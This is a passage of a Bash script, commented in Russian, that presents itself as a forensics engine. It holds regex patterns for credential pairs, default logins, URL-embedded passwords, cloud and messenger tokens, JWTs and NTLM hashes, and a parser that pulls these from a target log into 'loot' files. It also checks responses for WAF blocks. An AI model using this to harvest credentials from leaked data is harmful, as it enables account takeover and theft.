    # --- 2. НОМЕРА ТЕЛЕФОНОВ С ПАРОЛЕМ (PHONE:PASSWORD) ---
    # Вариант А: С обязательным международным префиксом плюс (+)
    '\b\+[0-9]{9,15}[[:space:]]*[:;|=[[:space:]]][[:space:]]*[^[:space:][:cntrl:];,\x27\x22]+\b'
    # Вариант Б: Без плюса (чистый цифровой идентификатор от 10 до 15 знаков, типично для СНГ/ЕС)
    '\b[0-9]{10,15}[[:space:]]*[:;|=[[:space:]]][[:space:]]*[^[:space:][:cntrl:];,\x27\x22]+\b'
    
    # --- 3. СИСТЕМНЫЕ И CMS УЧЕТНЫЕ ЗАПИСИ (COMMON LOGINS) ---
    # Захватывает дефолтные системные учетки, панели управления, базы данных и конфигурации маршрутизаторов
    '\b(admin|root|superuser|user|login|username|editor|manager|guest|dbuser|oracle|postgres|mysql|sa|support|administrator)[[:space:]]*[:;|=[[:space:]]][[:space:]]*[^[:space:][:cntrl:];,\x27\x22]+\b'
    
    # --- 4. URL-АВТОРgroupИЗАЦИЯ (IN-LINE URL CREDENTIALS) ---
    # Вытаскивает логины и пароли, встроенные прямо в адреса строк (протоколы http, https, ftp, sftp)
    # Пример: http://admin:p@ssword@192.168.1.1
    '\b(http|https|ftp|sftp|ssh|mongodb|redis):\/\/([^[:space:][:cntrl:]:]+):([^[:space:][:cntrl:]@]+)@'
    
    # --- 5. ФОРМАТЫ КВЕРЕЙ И ЛОГОВ БЕЗОПАСНОСТИ (KEY-VALUE PAIRS) ---
    # Парсит записи вида "user=myname pwd=mypas" или JSON-подобные структуры логов веб-серверов
    '\b(uid|user_id|usr|account|passwd|password|pass_wrd)[[:space:]]*[:;|=][[:space:]]*[^[:space:][:cntrl:];,\x27\x22]+\b'
    
    # --- 6. АНОМАЛЬНЫЕ И СЛОЖНЫЕ СТРУКТУРЫ (HEX / HASH / SPECIAL COMB) ---
    # Предназначен для извлечения строк, где вместо пароля подставлен хэш или токен
    # Пример: admin:098f6bcd4621d373cade4e832627b4f6
    '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}[:;][a-fA-F0-9]{32,64}\b'
)

# ==============================================================================
# @matrix: GLOBAL_FILTER_MATRIX (МАТРИЦА Ь) v2.0
# @description: Ультимативный многослойный реестр маркеров фильтрации и тегов форензик-логов
# АРХИТЕКТУРА: Раздельные векторы подсистем (Сетевой, Корпоративный, Крипто, Системный)
# СОВМЕСТИМОСТЬ: POSIX ERE / Extended Regular Expressions (grep -E, AWK, sed)
# @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | UNBREAKABLE INTEGRATION
# ==============================================================================
GLOBAL_FILTER_MATRIX=(
    # --------------------------------------------------------------------------
    # СЛОЙ [0]: СВОДНЫЙ ИНДИКАТОР УСПЕШНОГО ДЕТЕКТА (PRIMARY MATCH DETECTION)
    # Перехват любых явных фиксаций совпадений, триггеров и фактов обнаружения целей
    # --------------------------------------------------------------------------
    'MATCH|FOUND|DETECTED|CAPTURED|IDENTIFIED|SUCCESS|ENGAGED|HIT|TARGET_HIT|EXPOSED'

    # --------------------------------------------------------------------------
    # СЛОЙ [1]: КОРПОРАТИВНЫЙ И ПЕРСОНАЛЬНЫЙ ФОРЕНЗИК (IDENTITY & BREACH DATA)
    # Маркеры компрометации, утечек, персональных данных и телеметрии операторов связи
    # --------------------------------------------------------------------------
    'BREACH|LEAK|COMPROMISED|PASSPORT|FIO|DOB|GENDER|NATIONALITY|SNILS|INN|BIOMETRIC'

    # --------------------------------------------------------------------------
    # СЛОЙ [2]: ТЕЛЕКОММУНИКАЦИОННЫЙ ВЕКТОР (TELECOM & CONTACT INFRASTRUCTURE)
    # Маркеры сотовой связи, метаданных SIM-карт, мессенджеров и привязок номеров
    # --------------------------------------------------------------------------
    'PHONE|OPER|CARRIER|MCC|MNC|IMSI|IMEI|SIM|VIBER|WHATSAPP|TELEGRAM|CONTACT'

    # --------------------------------------------------------------------------
    # СЛОЙ [3]: СЕТЕВАЯ И СИСТЕМНАЯ ИНФРАСТРУКТУРА (NETWORK & ROUTING METRICS)
    # Глубокие маркеры сетевого уровня, DNS, криптографической защиты сокетов и провайдеров
    # --------------------------------------------------------------------------
    'DNS|SSL|TLS|CIPHER|CERTIFICATE|SUBJECT|ISSUER|EXPIRES|ORG|ASN|ISP|IP_DATA|GEO|COUNTRY|CITY'

    # --------------------------------------------------------------------------
    # СЛОЙ [4]: КРИПТОГРАФИЧЕСКИЙ ФОРЕНЗИК (CRYPTO & SIGNATURE FORENSICS)
    # Следы транзакций, адреса кошельков, типы хэшей и сигнатуры утекших баз данных
    # --------------------------------------------------------------------------
    'CRYPTO|WALLET|BLOCKCHAIN|TXID|BALANCE|HASH|MD5|SHA1|SHA256|SHA512|NTLM|PASSWORD'

    # --------------------------------------------------------------------------
    # СЛОЙ [5]: СИСТЕМНЫЙ ЛОГ И РЕКУРСИВНЫЙ ТРЕКИНГ (RECURSIVE CONTROL & CRAWLER)
    # Метки прохождения рекурсивных циклов, глубокого парсинга и асинхронного краулинга
    # --------------------------------------------------------------------------
    'RECURSIVE|EXTRACTED|HARVESTED|CRAWLER|PARSED|EXT_IP|EXT_EMAIL|DEEP_HUNT|BRIDGE|SIGNAL'
)

# Функция-детектор: проверяет наличие блокировки в ответе
check_for_waf_blocks() {
    local response_content="$1"
    for pattern in "${GLOBAL_ANTI_FLOOD_MATRIX[@]}"; do
        if echo "$response_content" | grep -Ei "$pattern" > /dev/null; then
            return 0 # Блокировка найдена
        fi
    done
    return 1 # Всё чисто
}


# ==============================================================================
# @description: СИСТЕМНЫЙ ДВИЖОК ГЛУБОКОГО АНАЛИЗА И ПАРСИНГА ЛОГОВ/АРТЕФАКТОВ v20.0
# МОДЕРНИЗАЦИЯ: Полный переход на 100% матричную архитектуру ядра фреймворка
# ИНТЕГРАЦИЯ: GLOBAL_HASH_MATRIX, GLOBAL_AV_MATRIX, GLOBAL_GATEWAY_MATRIX, 
#              GLOBAL_NET_MATRIX, GLOBAL_CRYPTO_MATRIX и GLOBAL_AUTH_MATRIX
# ФУНКЦИОНАЛ: Тотальный статический форензик, Secret Hunting, парсинг COMB-потоков
# АРХИТЕКТУРА: Чистый POSIX ERE Bash конвейер без внешних зависимостей
# @status: GHOST-SPEED COMPLIANT | ZERO LOOSE VARIABLES | NO SHORTENINGS
# ==============================================================================
core_engine_parse_target_log() {
    local log_file="$1"
    
    # --------------------------------------------------------------------------
    # 0. ПРЕДВАРИТЕЛЬНАЯ ВАЛИДАЦИЯ И ИНИЦИАЛИЗАЦИЯ КОНТЕКСТА
    # --------------------------------------------------------------------------
    if [[ ! -f "$log_file" ]]; then
        core_engine_ui "e" "Критическая ошибка: Файл '$log_file' не найден или недоступен для чтения движком."
        return 1
    fi

    core_engine_ui "h" "CORE PARSER: ARTIFACT & FORENSICS ENGINE v20.0 [TOTAL MATRIX]"
    core_engine_ui "i" "Цель комплексного матричного анализа: $(basename "$log_file")"
    core_engine_ui "line" ""
    
    core_engine_progress 2 "STARTING_DEEP_PARSING"
    sleep 1

    local base_loot_dir="${PRIME_LOOT:-$BASE_DIR/loot}"
    local log_name=$(basename "$log_file" | sed 's/\.[^.]*$//')
    
    # Полностью изолированные файлы отчетов в loot-директории
    local creds_loot_file="$base_loot_dir/${log_name}_extracted_creds.txt"
    local av_alerts_file="$base_loot_dir/${log_name}_malware_alerts.txt"
    local gateway_report_file="$base_loot_dir/${log_name}_gateways_detected.txt"
    local crypto_loot_file="$base_loot_dir/${log_name}_crypto_hashes.txt"
    local net_infra_file="$base_loot_dir/${log_name}_net_infrastructure.txt"
    local secrets_loot_file="$base_loot_dir/${log_name}_infrastructure_secrets.txt"
    
    mkdir -p "$base_loot_dir" 2>/dev/null

    core_engine_ui "i" "Запуск сквозного сканирования структуры по единым реестрам..."
    core_engine_ui "line" ""

    # Стерильная пре-очистка целевых накопителей данных перед анализом
    : > "$crypto_loot_file"
    : > "$net_infra_file"
    : > "$secrets_loot_file"
    : > "$creds_loot_file"

    # --------------------------------------------------------------------------
    # 1. СВЯЗКА С GLOBAL_CRYPTO_MATRIX (СЛОЙ ОХОТЫ ЗА СЕКРЕТАМИ И API-КЛЮЧАМИ)
    # --------------------------------------------------------------------------
    core_engine_ui "i" "Парсинг GLOBAL_CRYPTO_MATRIX. Сканирование инфраструктурных секретов..."

    local cry_rx_sha256="${GLOBAL_CRYPTO_MATRIX[0]}"
    local cry_rx_sha512="${GLOBAL_CRYPTO_MATRIX[1]}"
    local cry_rx_context="${GLOBAL_CRYPTO_MATRIX[2]}"
    local cry_rx_tg="${GLOBAL_CRYPTO_MATRIX[3]}"
    local cry_rx_discord="${GLOBAL_CRYPTO_MATRIX[4]}"
    local cry_rx_slack="${GLOBAL_CRYPTO_MATRIX[5]}"
    local cry_rx_jwt="${GLOBAL_CRYPTO_MATRIX[6]}"
    local cry_rx_aws="${GLOBAL_CRYPTO_MATRIX[7]}"
    local cry_rx_google="${GLOBAL_CRYPTO_MATRIX[8]}"
    local cry_rx_github="${GLOBAL_CRYPTO_MATRIX[9]}"
    local cry_rx_rsa="${GLOBAL_CRYPTO_MATRIX[10]}"

    local total_secrets_found=0

    if [[ -n "$cry_rx_context" ]]; then
        local ctx_secrets=$(grep -oE "$cry_rx_context" "$log_file" | sort -u)
        if [[ -n "$ctx_secrets" ]]; then
            local c_ctx=$(echo "$ctx_secrets" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" ">> [CRYPTO-NEXUS] Вытащены контекстные секреты (API/Wallet/Private): $c_ctx"
            echo -e "--- CONTEXTUAL SYSTEM SECRET ARTIFACTS ---\n$ctx_secrets\n" >> "$secrets_loot_file"
            total_secrets_found=$((total_secrets_found + c_ctx))
        fi
    fi

    if [[ -n "$cry_rx_tg" || -n "$cry_rx_discord" || -n "$cry_rx_slack" ]]; then
        local messengers_found=$(grep -oE "$cry_rx_tg|$cry_rx_discord|$cry_rx_slack" "$log_file" | sort -u)
        if [[ -n "$messengers_found" ]]; then
            local c_msg=$(echo "$messengers_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" ">> [CRYPTO-NEXUS] КРИТИЧЕСКИЙ ДЕТЕКТ: Токены мессенджеров (Telegram/Discord/Slack): $c_msg"
            echo -e "--- MESSENGER ACCESS TOKENS ---\n$messengers_found\n" >> "$secrets_loot_file"
            total_secrets_found=$((total_secrets_found + c_msg))
        fi
    fi

    if [[ -n "$cry_rx_jwt" ]]; then
        local jwt_found=$(grep -oE "$cry_rx_jwt" "$log_file" | sort -u)
        if [[ -n "$jwt_found" ]]; then
            local c_jwt=$(echo "$jwt_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" ">> [CRYPTO-NEXUS] Извлечены сессионные JWT / ID Web-токены: $c_jwt"
            echo -e "--- OAUTH JWT TOKENS (RFC 7519) ---\n$jwt_found\n" >> "$secrets_loot_file"
            total_secrets_found=$((total_secrets_found + c_jwt))
        fi
    fi

    if [[ -n "$cry_rx_aws" || -n "$cry_rx_google" || -n "$cry_rx_github" ]]; then
        local cloud_found=$(grep -oE "$cry_rx_aws|$cry_rx_google|$cry_rx_github" "$log_file" | sort -u)
        if [[ -n "$cloud_found" ]]; then
            local c_cloud=$(echo "$cloud_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "e" ">> [CRYPTO-NEXUS] КРИТИЧЕСКИЙ ВЕКТОР: Скомпрометированы ключи Cloud/Dev (AWS/Google/GitHub): $c_cloud"
            echo -e "--- CLOUD & INFRASTRUCTURE TOKENS (AWS, GOOGLE, GITHUB) ---\n$cloud_found\n" >> "$secrets_loot_file"
            total_secrets_found=$((total_secrets_found + c_cloud))
        fi
    fi

    if [[ -n "$cry_rx_rsa" ]]; then
        local rsa_found=$(grep -Ei "$cry_rx_rsa" "$log_file" | sort -u)
        if [[ -n "$rsa_found" ]]; then
            core_engine_ui "e" ">> [CRYPTO-NEXUS] ОБНАРУЖЕНЫ СТРУКТУРНЫЕ ЗАГОЛОВКИ PRIVATE KEY (RSA/SSH)!"
            echo -e "--- PRIV KEY HEADERS LOCATIONS ---\n$rsa_found\n" >> "$secrets_loot_file"
            total_secrets_found=$((total_secrets_found + 1))
        fi
    fi

    # --------------------------------------------------------------------------
    # 2. СВЯЗКА С GLOBAL_HASH_MATRIX (МНОГОУРОВНЕВЫЙ КРИПТО-АНАЛИЗ ХЭШЕЙ)
    # --------------------------------------------------------------------------
    core_engine_ui "line" ""
    core_engine_ui "i" "Парсинг GLOBAL_HASH_MATRIX. Извлечение крипто-структур..."

    local rx_md5="${GLOBAL_HASH_MATRIX[0]}"
    local rx_sha1="${GLOBAL_HASH_MATRIX[1]}"
    local rx_sha256_mat="${GLOBAL_HASH_MATRIX[2]}"
    local rx_sha512_mat="${GLOBAL_HASH_MATRIX[3]}"
    local rx_ntlm1="${GLOBAL_HASH_MATRIX[4]}"
    local rx_ntlm2="${GLOBAL_HASH_MATRIX[5]}"
    local rx_context="${GLOBAL_HASH_MATRIX[6]}"
    local rx_sql="${GLOBAL_HASH_MATRIX[7]}"

    local final_rx_sha256="${rx_sha256_mat:-$cry_rx_sha256}"
    local final_rx_sha512="${rx_sha512_mat:-$cry_rx_sha512}"

    if [[ -n "$rx_md5" ]]; then
        local md5_found=$(grep -oE "$rx_md5" "$log_file" | sort -u)
        if [[ -n "$md5_found" ]]; then
            local count_md5=$(echo "$md5_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "s" ">> [HASH] Обнаружены сигнатуры MD5/CRC32: $count_md5 объектов."
            echo -e "--- MD5 / CRC32 HASHES ---\n$md5_found\n" >> "$crypto_loot_file"
        fi
    fi

    if [[ -n "$rx_sha1" ]]; then
        local sha1_found=$(grep -oE "$rx_sha1" "$log_file" | sort -u)
        if [[ -n "$sha1_found" ]]; then
            local count_sha1=$(echo "$sha1_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "s" ">> [HASH] Обнаружены сигнатуры SHA-1: $count_sha1 объектов."
            echo -e "--- SHA-1 / RIPEMD-160 HASHES ---\n$sha1_found\n" >> "$crypto_loot_file"
        fi
    fi

    if [[ -n "$final_rx_sha256" ]]; then
        local sha256_found=$(grep -oE "$final_rx_sha256" "$log_file" | sort -u)
        if [[ -n "$sha256_found" ]]; then
            local count_sha256=$(echo "$sha256_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "s" ">> [HASH] Обнаружены сигнатуры SHA-256: $count_sha256 объектов."
            echo -e "--- SHA-256 HASHES ---\n$sha256_found\n" >> "$crypto_loot_file"
        fi
    fi

    if [[ -n "$final_rx_sha512" ]]; then
        local sha512_found=$(grep -oE "$final_rx_sha512" "$log_file" | sort -u)
        if [[ -n "$sha512_found" ]]; then
            local count_sha512=$(echo "$sha512_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "s" ">> [HASH] Обнаружены сигнатуры SHA-512: $count_sha512 объектов."
            echo -e "--- SHA-512 HASHES ---\n$sha512_found\n" >> "$crypto_loot_file"
        fi
    fi

    if [[ -n "$rx_ntlm1" || -n "$rx_ntlm2" ]]; then
        local ntlm_found=$(grep -oE "$rx_ntlm1|$rx_ntlm2" "$log_file" | sort -u)
        if [[ -n "$ntlm_found" ]]; then
            local count_ntlm=$(echo "$ntlm_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" ">> [HASH] ВНИМАНИЕ: Извлечены Windows NTLM/LM кэши: $count_ntlm пар."
            echo -e "--- WINDOWS NTLM / LM DUMPS ---\n$ntlm_found\n" >> "$crypto_loot_file"
        fi
    fi

    if [[ -n "$rx_context" || -n "$rx_sql" ]]; then
        local ctx_found=$(grep -oE "$rx_context|$rx_sql" "$log_file" | sort -u)
        if [[ -n "$ctx_found" ]]; then
            local count_ctx=$(echo "$ctx_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" ">> [HASH] Найдено присвоение хэшей в контексте/SQL: $count_ctx"
            echo -e "--- EXTRACTED CONTEXTUAL & SQL ASSIGNMENTS ---\n$ctx_found\n" >> "$crypto_loot_file"
        fi
    fi

    # --------------------------------------------------------------------------
    # 3. СВЯЗКА С GLOBAL_NET_MATRIX (АНАЛИЗ СЕТЕВОЙ ИЗОЛЯЦИИ И ИНФРАСТРУКТУРЫ)
    # --------------------------------------------------------------------------
    core_engine_ui "line" ""
    core_engine_ui "i" "Парсинг GLOBAL_NET_MATRIX. Классификация сетевой адресации..."

    local net_rx_loop1="${GLOBAL_NET_MATRIX[0]}"
    local net_rx_loop2="${GLOBAL_NET_MATRIX[1]}"
    local net_rx_priv1="${GLOBAL_NET_MATRIX[2]}"
    local net_rx_priv2="${GLOBAL_NET_MATRIX[3]}"
    local net_rx_priv3="${GLOBAL_NET_MATRIX[4]}"
    local net_rx_spec1="${GLOBAL_NET_MATRIX[5]}"
    local net_rx_spec2="${GLOBAL_NET_MATRIX[6]}"
    local net_rx_spec3="${GLOBAL_NET_MATRIX[7]}"
    local net_rx_spec4="${GLOBAL_NET_MATRIX[8]}"
    local net_rx_v6_1="${GLOBAL_NET_MATRIX[9]}"
    local net_rx_v6_2="${GLOBAL_NET_MATRIX[10]}"

    local total_net_incidents=0

    if [[ -n "$net_rx_loop1" || -n "$net_rx_loop2" ]]; then
        local loops_found=$(grep -oE "$net_rx_loop1|$net_rx_loop2" "$log_file" | sort -u)
        if [[ -n "$loops_found" ]]; then
            local c_loops=$(echo "$loops_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "s" ">> [NET-MATRIX] Обнаружены локальные петли (Loopback): $c_loops"
            echo -e "--- LOCALHOST / LOOPBACK DETECTED ---\n$loops_found\n" >> "$net_infra_file"
            total_net_incidents=$((total_net_incidents + c_loops))
        fi
    fi

    if [[ -n "$net_rx_priv1" || -n "$net_rx_priv2" || -n "$net_rx_priv3" ]]; then
        local priv_found=$(grep -oE "$net_rx_priv1|$net_rx_priv2|$net_rx_priv3" "$log_file" | sort -u)
        if [[ -n "$priv_found" ]]; then
            local c_priv=$(echo "$priv_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" ">> [NET-MATRIX] Извлечены адреса приватных подсетей (RFC 1918): $c_priv"
            echo -e "--- PRIVATE NETWORKS INFRASTRUCTURE (RFC 1918) ---\n$priv_found\n" >> "$net_infra_file"
            total_net_incidents=$((total_net_incidents + c_priv))
        fi
    fi

    if [[ -n "$net_rx_spec1" || -n "$net_rx_spec2" || -n "$net_rx_spec3" || -n "$net_rx_spec4" ]]; then
        local spec_found=$(grep -oE "$net_rx_spec1|$net_rx_spec2|$net_rx_spec3|$net_rx_spec4" "$log_file" | sort -u)
        if [[ -n "$spec_found" ]]; then
            local c_spec=$(echo "$spec_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" ">> [NET-MATRIX] Найдены служебные/специальные IP (APIPA/Multicast/Broadcast): $c_spec"
            echo -e "--- SPECIAL USE & BROADCAST IP ADDRESSES ---\n$spec_found\n" >> "$net_infra_file"
            total_net_incidents=$((total_net_incidents + c_spec))
        fi
    fi

    if [[ -n "$net_rx_v6_1" || -n "$net_rx_v6_2" ]]; then
        local v6_found=$(grep -oE "$net_rx_v6_1|$net_rx_v6_2" "$log_file" | sort -u)
        if [[ -n "$v6_found" ]]; then
            local c_v6=$(echo "$v6_found" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "s" ">> [NET-MATRIX] Обнаружена локальная адресация IPv6 (ULA/Link-Local): $c_v6"
            echo -e "--- IPv6 LOCAL & UNIQUE LOCAL ADDRESSES ---\n$v6_found\n" >> "$net_infra_file"
            total_net_incidents=$((total_net_incidents + c_v6))
        fi
    fi

    # --------------------------------------------------------------------------
    # 4. ИНТЕГРИРОВАННЫЙ АНТИВИРУСНЫЙ СЛОЙ: АНАЛИЗ УГРОЗ (GLOBAL_AV_MATRIX)
    # --------------------------------------------------------------------------
    core_engine_ui "line" ""
    core_engine_ui "i" "Запуск Сигнатурного Антивирусного Движка (Anti-Malware Core)..."
    local malware_detected=0
    local av_layer_index=1
    
    : > "$av_alerts_file"

    for pattern in "${GLOBAL_AV_MATRIX[@]}"; do
        [[ -z "$pattern" ]] && continue
        
        local matches=$(grep -Ei "$pattern" "$log_file" | sort -u)
        if [[ -n "$matches" ]]; then
            local match_count=$(echo "$matches" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "e" "AV_LAYER_$av_layer_index DETECT: Обнаружено $match_count угроз(ы)!"
            echo -e "=== AV MATRIX DETECT: LAYER $av_layer_index ===" >> "$av_alerts_file"
            echo "$matches" >> "$av_alerts_file"
            echo -e "" >> "$av_alerts_file"
            malware_detected=$((malware_detected + match_count))
        fi
        av_layer_index=$((av_layer_index + 1))
    done

    # --------------------------------------------------------------------------
    # 5. ШЛЮЗОВОЙ УРОВЕНЬ И ОТСЕЧЕНИЕ ШУМА ПЛАТФОРМ (GLOBAL_GATEWAY_MATRIX)
    # --------------------------------------------------------------------------
    core_engine_ui "i" "Анализ сетевой маршрутизации и классификация шлюзов (Gateway Nexus)..."
    local platform_noise_rx="${GLOBAL_GATEWAY_MATRIX[0]}"
    local darkweb_gateways_rx="${GLOBAL_GATEWAY_MATRIX[3]}"

    : > "$gateway_report_file"

    if [[ -n "$darkweb_gateways_rx" ]]; then
        local dark_matches=$(grep -Ei "$darkweb_gateways_rx" "$log_file" | sort -u)
        if [[ -n "$dark_matches" ]]; then
            local count_dark=$(echo "$dark_matches" | grep -v '^$' | wc -l || echo 0)
            core_engine_ui "w" "ОБНАРУЖЕНО ШЛЮЗЫ СКРЫТЫХ СЕТЕЙ (Tor2Web/Onion): $count_dark локаций!"
            echo "$dark_matches" >> "$gateway_report_file"
        fi
    fi

    if [[ -n "$platform_noise_rx" ]]; then
        local noise_count=$(grep -Eic "$platform_noise_rx" "$log_file" || echo 0)
        if (( noise_count > 0 )); then
            core_engine_ui "i" "Изолировано и пропущено $noise_count платформенных роутов (социальный шум)."
        fi
    fi

    # --------------------------------------------------------------------------
    # 6. УЧЕТНЫЕ ДАННЫЕ И COMB-ПОТОКИ: ИНТЕГРАЦИЯ С GLOBAL_AUTH_MATRIX
    # --------------------------------------------------------------------------
    core_engine_ui "line" ""
    core_engine_ui "i" "Подключение GLOBAL_AUTH_MATRIX. Глубокий парсинг учетных записей..."

    # Динамический сбор из индексов матрицы аутентификации фреймворка
    local count_creds=0
    
    for auth_pattern in "${GLOBAL_AUTH_MATRIX[@]}"; do
        [[ -z "$auth_pattern" ]] && continue
        
        local temp_creds=""
        # Если задан платформенный шум — фильтруем его на лету
        if [[ -n "$platform_noise_rx" ]]; then
            temp_creds=$(grep -oE "$auth_pattern" "$log_file" | grep -Ei -v "$platform_noise_rx" | sort -u)
        else
            temp_creds=$(grep -oE "$auth_pattern" "$log_file" | sort -u)
        fi
        
        if [[ -n "$temp_creds" ]]; then
            local current_batch_count=$(echo "$temp_creds" | grep -v '^$' | wc -l || echo 0)
            echo "$temp_creds" >> "$creds_loot_file"
            count_creds=$((count_creds + current_batch_count))
        fi
    done

    # Дополнительная очистка финального файла от дубликатов, возникших на стыках регулярных выражений
    if [[ -s "$creds_loot_file" ]]; then
        local clean_creds=$(sort -u "$creds_loot_file")
        echo "$clean_creds" > "$creds_loot_file"
        count_creds=$(grep -c "^" "$creds_loot_file" 2>/dev/null || echo 0)
    fi

    # --------------------------------------------------------------------------
    # 7. ИТОГОВЫЙ СИСТЕМНЫЙ ОТЧЕТ В КОНСОЛЬ (UI-NEXUS GENERATION)
    # --------------------------------------------------------------------------
    core_engine_ui "line" ""
    core_engine_ui "s" "ГЛУБОКИЙ КОМПЛЕКСНЫЙ МАТРИЧНЫЙ АНАЛИЗ ЗАВЕРШЕН"
    core_engine_ui "line" ""
    
    echo -e "${B}Анализируемый целевой объект:${NC} $log_file"
    echo -e "${Y}Извлечено валидных учетных записей (Auth Core):${NC} $count_creds пар(ы) логин:пароль."
    echo -e "${R}Всего обнаружено вредоносных активностей (AV Core):${NC} $malware_detected инцидентов."
    echo -e "${G}Извлечено сетевых локальных адресов (Net Core):${NC} $total_net_incidents объектов."
    echo -e "${P}Всего извлечено критических ключей/секретов (Secret Core):${NC} $total_secrets_found токенов."
    
    # Обработка и сохранение отчета по инфраструктурным секретам
    if [[ -s "$secrets_loot_file" ]]; then
        core_engine_ui "s" "Критические токены и системные API-ключи изолированы:"
        echo -e "${P}📂 Infrastructure Secrets: $secrets_loot_file${NC}"
        core_engine_loot "secrets_parser" "Извлечены сервисные ключи/токены из $log_name"
    else
        rm -f "$secrets_loot_file" 2>/dev/null
    fi

    # Обработка и сохранение криптографического отчета по хэшам
    if [[ -s "$crypto_loot_file" ]]; then
        core_engine_ui "s" "Криптографические хэш-артефакты экспортированы:"
        echo -e "${G}📂 Crypto Loot: $crypto_loot_file${NC}"
        core_engine_loot "crypto_parser" "Извлечены крипто-хэши из $log_name"
    else
        rm -f "$crypto_loot_file" 2>/dev/null
    fi

    # Обработка сетевого отчета
    if [[ -s "$net_infra_file" ]]; then
        core_engine_ui "s" "Топология локальной сети сохранена:"
        echo -e "${G}📂 Net Infrastructure: $net_infra_file${NC}"
        core_engine_loot "net_parser" "Сформирована сетевая карта для $log_name"
    else
        rm -f "$net_infra_file" 2>/dev/null
    fi

    # Обработка учетных данных из GLOBAL_AUTH_MATRIX
    if (( count_creds > 0 )); then
        core_engine_ui "s" "Артефакты авторизации успешно экспортированы:"
        echo -e "${G}📂 База учетных записей Loot: $creds_loot_file${NC}"
        core_engine_loot "parser" "Парсинг $log_name завершен. Извлечено из GLOBAL_AUTH_MATRIX записей: $count_creds"
    else
        rm -f "$creds_loot_file" 2>/dev/null
    fi

    # Обработка вредоносных алертов
    if (( malware_detected > 0 )); then
        core_engine_ui "w" "КРИТИЧЕСКИЙ ОТЧЕТ БЕЗОПАСНОСТИ СФОРМИРОВАН:"
        echo -e "${R}📂 Точки компрометации сохранены в: $av_alerts_file${NC}"
    else
        rm -f "$av_alerts_file" 2>/dev/null
    fi

    [[ -f "$gateway_report_file" && ! -s "$gateway_report_file" ]] && rm -f "$gateway_report_file"
    
    core_engine_ui "line" ""
    core_engine_wait
}


# ==========================================
# 1. CORE ENGINE (Должны быть ПЕРВЫМИ)
# ==========================================

# ==============================================================================
# @description: CORE ENGINE: UI MARKER v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Разделение потоков (stdout/stderr), поддержка динамики
# ==============================================================================
core_engine_ui() {
    local type="$1"
    local message="$2"
    
    # Редирект в stderr (>&2) для типов e и ! (ошибки/предупреждения)
    # Это позволяет перенаправлять "успешные" данные в pipe, а ошибки — на экран
    local stream=">&1"
    [[ "$type" =~ ^(e|!|w)$ ]] && stream=">&2"

    case "$type" in
        "h")    eval "echo -e '\n${B}>>> ${W}${message} ${B}<<<${NC}' $stream" ;;
        "i")    eval "echo -e '${B}[i]${NC} ${message}' $stream" ;;
        "s"|"+") eval "echo -e '${G}[+]${NC} ${message}' $stream" ;;
        "e"|"-") eval "echo -e '${R}[-]${NC} ${message}' $stream" ;;
        "w"|"!") eval "echo -e '${Y}[!]${NC} ${message}' $stream" ;;
        "line")  eval "echo -e '${B}---------------------------------------${NC}' $stream" ;;
    esac
}

# ==============================================================================
# @description: CORE ENGINE: HEURISTIC REMOVER v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Добавлена защита от удаления корня и пустых переменных
# ==============================================================================
core_engine_remove() {
    for item in "$@"; do
        # 1. Защита: пропускаем пустые пути
        [[ -z "$item" ]] && continue
        
        # 2. Hardening: предотвращаем удаление критических системных путей
        # Никогда не позволяем удалять корень, директории /etc, /bin, /root и т.д.
        if [[ "$item" =~ ^(/|/etc|/bin|/sbin|/usr|/root|/home)$ ]]; then
            core_engine_ui "!" "Критическая ошибка: Попытка удаления системного пути [$item] отклонена!"
            continue
        fi

        # 3. Эвристика: удаление с подавлением ошибок
        if [[ -d "$item" ]]; then
            rm -rf "$item" 2>/dev/null
        else
            rm -f "$item" 2>/dev/null
        fi
    done
}

# ==============================================================================
# @description: CORE ENGINE: DYNAMIC EXEC v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Добавлен захват Exit Code для внешнего контроля
# ==============================================================================
core_engine_exec() {
    local cmd="$1"
    local mode="${2:-silent}"
    local exec_status

    if [[ "$mode" == "silent" ]]; then
        bash -c "$cmd" >/dev/null 2>&1
        exec_status=$?
    else
        bash -c "$cmd"
        exec_status=$?
    fi

    # Возвращаем статус, чтобы родительская функция могла среагировать (Validator/Control)
    return $exec_status
}

# ==============================================================================
# @description: CORE ENGINE: ENV STERILIZER v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Добавлена проверка на пустоту путей (Hardening), защита от Root-ошибок
# ==============================================================================
core_engine_clean_env() {
    # Массив защищенных целей
    local cache_targets=(
        "/root/.cache/zcompdump*"
        "/root/.zcompdump*"
        "${HOME}/.cache/zcompdump*"
    )
    
    # "Чистка": фильтруем массив, убирая пустые или некорректные пути
    local valid_targets=()
    for target in "${cache_targets[@]}"; do
        # Игнорируем пути, которые выглядят как корень '/' или домашний каталог в чистом виде
        [[ "$target" =~ ^(/|/root|/home)$ ]] && continue
        valid_targets+=("$target")
    done
    
    # Передача в движок удаления только валидированных данных
    [[ ${#valid_targets[@]} -gt 0 ]] && core_engine_remove "${valid_targets[@]}"
}

# --- Инициализация системы ---

# ==============================================================================
# @description: CORE ENGINE: UI ITEM v2.0 [ARCHITECTURAL LIMIT]
# МОДЕРНИЗАЦИЯ: Автоматическое выравнивание (Padding) для ключей любой длины
# ==============================================================================
core_engine_item() {
    local key="$1" title="$2" desc="${3:-}"

    # Эвристика цвета
    local k_color=$G
